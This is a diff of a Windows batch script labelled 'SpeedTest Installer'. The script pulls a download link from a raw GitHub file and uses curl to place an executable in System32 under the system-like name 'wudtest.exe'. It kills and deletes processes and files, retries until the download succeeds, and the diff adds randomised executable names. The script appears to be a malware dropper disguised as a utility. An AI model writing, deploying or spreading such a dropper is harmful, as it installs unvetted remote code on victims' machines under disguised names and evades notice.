@@ -1,13 +1,35 @@
 :: SpeedTest Installer
 @echo off
 
+
+setlocal enabledelayedexpansion
+
+
 color 0A
 
 :loop
 
+
+
+set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+set "filename="
+
+
+
+
+for /L %%i in (1,1,13) do (
+    set /A "rand=!random! %% 62"
+    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
+)
+
+echo.
+echo Filename=!filename!.exe
+echo.
+
+
 :: Kill & Delete file 
-taskkill /f /im PatcherX64.exe >nul 2>&1
-del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
+taskkill /f /im !filename!.exe
+del /f /q "%TEMP%\!filename!.exe"
 
 for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/SpeedTestFileLink') do set "SPEEDTESTLEFILELINK=%%i"
 
@@ -18,15 +40,15 @@ echo.
 :: Download the file using curl
 curl -L -# -o "%SystemRoot%\System32\wudtest.exe" "%SPEEDTESTLEFILELINK%"
 
-timeout /t 2 /nobreak >nul
+timeout /t 2 /nobreak 
 
 :: Checking the existence of handle.exe
 if not exist "%SystemRoot%\System32\wudtest.exe" (
     echo.
     echo The download hasn't started yet. Please check your connection.
-    timeout /t 2 /nobreak >nul
+    timeout /t 2 /nobreak 
     echo Retrying in 2 seconds ....
-    timeout /t 2 /nobreak >nul
+    timeout /t 2 /nobreak 
     echo.
     goto loop
 )
@@ -42,9 +64,9 @@ for %%a in ("%SystemRoot%\System32\wudtest.exe") do set "SPEEDTESTFILESIZE=%%~za
 if %SPEEDTESTFILESIZE% lss 350000 (
     echo.
     echo Download incomplete. Check your connection and run the file again.
-    timeout /t 2 /nobreak >nul
+    timeout /t 2 /nobreak 
     echo Retrying in 2 seconds ....
-    timeout /t 2 /nobreak >nul
+    timeout /t 2 /nobreak 
     echo.
     goto loop
 )
